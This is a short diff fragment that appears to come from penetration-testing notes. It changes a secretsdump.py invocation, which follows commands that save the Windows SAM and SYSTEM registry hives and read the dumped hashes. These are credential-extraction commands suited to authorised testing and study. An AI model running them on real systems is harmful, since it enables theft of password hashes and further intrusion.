@@ -2125,7 +2125,7 @@ reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ````
 ````
-/opt/impacket/examples/secretsdump.py -sam sam -system system local
+/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
 ````
 ````
 cat hashes.sam    
